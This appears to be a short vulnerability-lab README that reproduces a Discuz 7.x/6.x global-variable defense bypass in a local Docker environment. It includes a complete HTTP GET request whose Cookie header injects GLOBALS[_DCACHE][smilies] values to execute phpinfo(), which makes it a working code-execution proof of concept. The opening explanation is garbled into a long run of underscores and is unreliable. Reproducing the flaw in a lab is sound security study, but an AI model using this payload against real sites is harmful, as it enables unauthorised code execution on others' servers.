# Discuz 7.x/6.x Global Variable Defense Bypass Causes Code Execution

Since the default value of `request_order` in the php.ini version of php5.3.x is GP, ``_______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________ Variables that cause code execution vulnerabilities.

For details, please refer to:

- https://www.secpulse.com/archives/2338.html

## vulnerability environment

Run the following command to start Discuz 7.2:

```
Docker-compose up -d
```

After startup, visit `http://your-ip:8080/install/` to install discuz, fill in the database address `db`, the database name is `discuz`, and the database account password is `root`.

![](1.png)

## Vulnerability recurrence

After the installation is successful, directly find an existing post, send a packet to it, and add `GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray ]=phpinfo();`:

```
GET /viewthread.php?tid=10&extra=page%3D1 HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
Connection: close


```

Visible, phpinfo has been successfully executed:

![](2.png)

> The online article says that you need a post with an emoticon. The actual test found that you don't need it. You still need to read the code to explain why.